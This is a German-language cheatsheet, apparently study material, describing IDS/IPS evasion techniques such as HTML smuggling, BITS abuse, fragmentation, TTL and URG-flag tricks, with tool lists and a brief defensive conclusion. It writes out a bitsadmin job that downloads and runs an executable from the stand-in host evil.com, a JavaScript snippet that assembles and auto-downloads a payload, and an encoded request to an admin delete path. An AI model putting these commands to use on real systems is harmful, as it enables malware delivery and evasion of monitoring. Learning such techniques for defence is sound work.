
# 🛡️ IDS Evasion Cheatsheet

Dieses Cheatsheet bietet einen umfassenden Überblick über gängige **IDS/IPS-Evasion-Techniken**, inklusive **Erklärung**, **Funktionsweise**, **Beispielen** und **Tools**.

---

## 🔸 1. HTML Smuggling

### Beschreibung
HTML Smuggling nutzt HTML/JavaScript, um **Schadcode clientseitig zusammenzusetzen**, sodass Firewalls, Proxies und IDS-Systeme ihn nicht erkennen können.

### Beispiel
```html
<a href="malicious.doc" download="Myfile.doc">Click</a>

<script>
  var blob = new Blob([payload], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'Myfile.doc';
  a.click();
</script>
```

### Tools
- HTMLSmuggler (GitHub)
- Eigene HTML/JS-Dateien mit Blobs

---

## 🔸 2. Windows BITS Abuse

### Beschreibung
Angreifer nutzen den legitimen Windows-Dienst **BITS** (Background Intelligent Transfer Service), um Schadcode unauffällig herunterzuladen.

### Beispiel
```bash
bitsadmin /create malwarejob
bitsadmin /addfile malwarejob http://evil.com/mal.exe C:\mal.exe
bitsadmin /SetNotifyCmdLine malwarejob C:\mal.exe NULL
bitsadmin /resume malwarejob
```

### Tools
- `bitsadmin`
- BitsParser (Analyse)

---

## 🔸 3. Insertion & Evasion

### Beschreibung
Manipulation einzelner Pakete, sodass das Ziel sie akzeptiert, aber das IDS sie **verwirft** oder **nicht erkennt**.

### Beispiel
- Senden unvollständiger oder manipuliert codierter Pakete
- Nutzung spezieller TCP-Optionen

---

## 🔸 4. False Positive Generation

### Beschreibung
Erzeugung von **massiven Fehlalarmen** im IDS, um echte Angriffe zu verschleiern.

### Beispiel
- Flooding mit harmlosen, aber signaturähnlichen Anfragen

### Ziel
- Überlastung des SOC / Ignorieren echter Alarme

---

## 🔸 5. Session Splicing

### Beschreibung
Aufteilung des Payloads auf viele kleine Pakete → IDS erkennt keine Signatur, Ziel setzt korrekt zusammen.

### Tools
- `fragroute`, `Scapy`, `Nessus`

---

## 🔸 6. Unicode Evasion

### Beschreibung
Verwendung mehrdeutiger Unicode-Darstellungen (z. B. `%u2215` für `/`), um IDS-Pattern-Matching zu umgehen.

### Beispiel
```http
GET /admin%u002fdelete HTTP/1.1
```

---

## 🔸 7. Fragmentation Attack

### Beschreibung
Angreifer steuert Fragment-Zustellung (Zeit/TTL/Reihenfolge), sodass das IDS **nicht korrekt reassembliert**, das Ziel aber schon.

### Tools
- `Scapy`, `fragroute`, `Hping3`

---

## 🔸 8. TTL Attack

### Beschreibung
Steuerung der Lebensdauer (TTL) einzelner Fragmente, damit **einige nur beim IDS, andere nur beim Ziel ankommen**.

---

## 🔸 9. URG Flag Attack

### Beschreibung
Nutzung des TCP-URG-Flags: IDS liest _alle_ Daten, Ziel verarbeitet nur die „dringenden“ – → unterschiedliche Sichtweise.

### Beispiel
- Schadcode nach dem Urgent Pointer → IDS ignoriert Wirkung

### Tools
- `Scapy`, `Hping3`, `Wireshark`

---

## 🛠️ Übersicht der wichtigsten Tools

| Tool         | Beschreibung                                 |
|--------------|----------------------------------------------|
| **Scapy**    | Paket-Crafting und Analyse                   |
| **Hping3**   | Erzeugen von TCP/IP-Paketen mit Optionen     |
| **fragroute**| TCP-Reassembly-Manipulation                  |
| **HTMLSmuggler** | HTML Smuggling Payload Generator        |
| **bitsadmin**| BITS Missbrauch                              |
| **Wireshark**| Analyse von URG/TTL/Fragmenten               |
| **Nessus**   | Schwachstellenscanner inkl. Fragmentation    |

---

## 📌 Fazit

IDS-Evasion-Techniken zielen darauf ab, das **Erkennungssystem auszutricksen**, **Überlasten**, oder durch **technische Besonderheiten der Protokolle zu umgehen**. Erfolgreicher Schutz erfordert:
- Reassembly-Logik im IDS
- Kontextbasierte Analyse
- Einsatz moderner SIEM- und Korrelationstools
